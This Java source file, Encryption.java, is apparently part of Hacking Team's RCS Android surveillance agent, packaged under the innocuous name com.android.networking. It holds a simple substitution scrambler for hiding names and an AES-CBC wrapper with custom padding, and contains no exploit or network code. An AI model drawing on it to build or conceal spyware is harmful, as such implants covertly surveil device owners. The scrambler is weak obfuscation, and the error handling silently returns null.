/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : Encryption.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.networking.crypto;

import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.zip.CRC32;

import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;

import com.android.networking.Messages;
import com.android.networking.auto.Cfg;
import com.android.networking.util.Check;
import com.android.networking.util.Utils;

// TODO: Auto-generated Javadoc

/**
 * The Class Encryption.
 */
public class Encryption {

	/** The Constant TAG. */
	private static final String TAG = "Encryption"; //$NON-NLS-1$

	/**
	 * Instantiates a new encryption.
	 * 
	 * @param key
	 *            the key
	 */
	public Encryption(final byte[] key) {
		makeKey(key);
	}

	/**
	 * Inits the.
	 */
	public static void init() {

	}

	/**
	 * Descrambla una stringa, torna il puntatore al nome descramblato. La
	 * stringa ritornata va liberata dal chiamante con una free()!!!!
	 * 
	 * @param Name
	 *            the name
	 * @param seed
	 *            the seed
	 * @return the string
	 */
	public static String decryptName(final String Name, final int seed) {
		return scramble(Name, seed, false);
	}

	/**
	 * Scrambla una stringa, torna il puntatore al nome scramblato. La stringa
	 * ritornata va liberata dal chiamante con una free()!!!!
	 * 
	 * @param Name
	 *            the name
	 * @param seed
	 *            the seed
	 * @return the string
	 */
	public static String encryptName(final String Name, final int seed) {
		// if(AutoConfig.DEBUG) Check.log( TAG + " seed : " + seed) ;//$NON-NLS-1$
		return scramble(Name, seed, true);
	}

	/**
	 * Gets the next multiple.
	 * 
	 * @param len
	 *            the len
	 * @return the next multiple
	 */
	public int getNextMultiple(final int len) {
		if (Cfg.DEBUG) {
			Check.requires(len >= 0, "len < 0"); //$NON-NLS-1$
		}
		final int newlen = len + (len % 16 == 0 ? 0 : 16 - len % 16);
		if (Cfg.DEBUG) {
			Check.ensures(newlen >= len, "newlen < len"); //$NON-NLS-1$
		}
		if (Cfg.DEBUG) {
			Check.ensures(newlen % 16 == 0, "Wrong newlen"); //$NON-NLS-1$
		}
		return newlen;
	}

	/**
	 * Questa funzione scrambla/descrambla una stringa e ritorna il puntatore
	 * alla nuova stringa. Il primo parametro e' la stringa da de/scramblare, il
	 * secondo UN byte di seed, il terzo se settato a TRUE scrambla, se settato
	 * a FALSE descrambla.
	 * 
	 * @param name
	 *            the name
	 * @param seed
	 *            the seed
	 * @param enc
	 *            the enc
	 * @return the string
	 */
	private static String scramble(final String name, int seed, final boolean enc) {
		final char[] retString = name.toCharArray();
		final int len = name.length();
		int i, j;

		final char[] alphabet = { '_', 'B', 'q', 'w', 'H', 'a', 'F', '8', 'T', 'k', 'K', 'D', 'M', 'f', 'O', 'z', 'Q',
				'A', 'S', 'x', '4', 'V', 'u', 'X', 'd', 'Z', 'i', 'b', 'U', 'I', 'e', 'y', 'l', 'J', 'W', 'h', 'j',
				'0', 'm', '5', 'o', '2', 'E', 'r', 'L', 't', '6', 'v', 'G', 'R', 'N', '9', 's', 'Y', '1', 'n', '3',
				'P', 'p', 'c', '7', 'g', '-', 'C' };

		final int alphabetLen = alphabet.length;

		if (seed < 0) {
			seed = -seed;
		}

		// Evita di lasciare i nomi originali anche se il byte e' 0
		seed = (seed > 0) ? seed %= alphabetLen : seed;

		if (seed == 0) {
			seed = 1;
		}
		if (Cfg.DEBUG) {
			Check.asserts(seed > 0, "negative seed"); //$NON-NLS-1$
		}
		for (i = 0; i < len; i++) {
			for (j = 0; j < alphabetLen; j++) {
				if (retString[i] == alphabet[j]) {
					// Se crypt e' TRUE cifra, altrimenti decifra
					if (enc) {
						retString[i] = alphabet[(j + seed) % alphabetLen];
					} else {
						retString[i] = alphabet[(j + alphabetLen - seed) % alphabetLen];
					}

					break;
				}
			}
		}

		return new String(retString);
	}

	/** The crypto. */
	Crypto crypto;

	/**
	 * Make key.
	 * 
	 * @param key
	 *            the key
	 */
	public void makeKey(final byte[] key) {
		try {
			crypto = new Crypto(key);
		} catch (final NoSuchAlgorithmException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(e);//$NON-NLS-1$
			}
		} catch (final NoSuchPaddingException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(e);//$NON-NLS-1$
			}
		}
	}

	/**
	 * Decrypt data.
	 * 
	 * @param cyphered
	 *            the cyphered
	 * @return the byte[]
	 * @throws CryptoException
	 *             the crypto exception
	 */
	public byte[] decryptData(final byte[] cyphered) throws CryptoException {
		return decryptData(cyphered, cyphered.length, 0);
	}

	/**
	 * Decrypt data.
	 * 
	 * @param cyphered
	 *            the cyphered
	 * @param offset
	 *            the offset
	 * @return the byte[]
	 * @throws CryptoException
	 *             the crypto exception
	 */
	public byte[] decryptData(final byte[] cyphered, final int offset) throws CryptoException {
		return decryptData(cyphered, cyphered.length - offset, offset);
	}

	/**
	 * Decrypt data, CBC mode.
	 * 
	 * @param cyphered
	 *            the cyphered
	 * @param plainlen
	 *            the plainlen
	 * @param offset
	 *            the offset
	 * @return the byte[]
	 * @throws CryptoException
	 *             the crypto exception
	 */
	public byte[] decryptData(final byte[] cyphered, final int plainlen, final int offset) throws CryptoException {
		final int enclen = cyphered.length - offset;
		if (Cfg.DEBUG) {
			Check.requires(enclen % 16 == 0, "Wrong padding"); //$NON-NLS-1$
		}
		if (Cfg.DEBUG) {
			Check.requires(enclen >= plainlen, "Wrong plainlen"); //$NON-NLS-1$
		}
		
		if (Cfg.DEBUG) {
			Check.requires(crypto != null, "null encryption"); //$NON-NLS-1$
		}
		
		byte[] plain=null;
		try {
			plain = crypto.decrypt(cyphered, plainlen, offset);
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
		
		return plain;
	}

	/**
	 * Encrypt data.
	 * 
	 * @param plain
	 *            the plain
	 * @return the byte[]
	 */
	public byte[] encryptData(final byte[] plain) {
		return encryptData(plain, 0);
	}

	/**
	 * Encrypt data in CBC mode and HT padding.
	 * 
	 * @param plain
	 *            the plain
	 * @param offset
	 *            the offset
	 * @return the byte[]
	 */
	public byte[] encryptData(final byte[] plain, final int offset) {

		final int len = plain.length - offset;

		// TODO: optimize, non creare padplain, considerare caso particolare
		// ultimo blocco
		final byte[] padplain = pad(plain, offset, len);
		final int clen = padplain.length;

		if (Cfg.DEBUG) {
			Check.asserts(clen % 16 == 0, "Wrong padding"); //$NON-NLS-1$
		}
		byte[] crypted=null;
		try {
			crypted = crypto.encrypt(padplain);
		} catch (Exception e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		} 

		return crypted;
	}



	/**
	 * Old style Pad, PKCS5 is available in EncryptionPKCS5.
	 * 
	 * @param plain
	 *            the plain
	 * @param offset
	 *            the offset
	 * @param len
	 *            the len
	 * @return the byte[]
	 */
	protected byte[] pad(final byte[] plain, final int offset, final int len) {
		return pad(plain, offset, len, false);
	}

	/**
	 * Pad.
	 * 
	 * @param plain
	 *            the plain
	 * @param offset
	 *            the offset
	 * @param len
	 *            the len
	 * @param PKCS5
	 *            the pKC s5
	 * @return the byte[]
	 */
	protected byte[] pad(final byte[] plain, final int offset, final int len, final boolean PKCS5) {
		final int clen = getNextMultiple(len);
		if (clen > 0) {
			final byte[] padplain = new byte[clen];
			if (PKCS5) {
				final int value = clen - len;
				for (int i = 1; i <= value; i++) {
					padplain[clen - i] = (byte) value;
				}
			}
			System.arraycopy(plain, offset, padplain, 0, len);
			return padplain;
		} else {
			return plain;
		}
	}

	/**
	 * Xor.
	 * 
	 * @param pt
	 *            the pt
	 * @param iv
	 *            the iv
	 */
	void xor(final byte[] pt, final byte[] iv) {
		if (Cfg.DEBUG) {
			Check.requires(pt.length == 16, "pt not 16 bytes long"); //$NON-NLS-1$
		}
		if (Cfg.DEBUG) {
			Check.requires(iv.length == 16, "iv not 16 bytes long"); //$NON-NLS-1$
		}
		for (int i = 0; i < 16; i++) {
			pt[i] ^= iv[i];
		}
	}

}
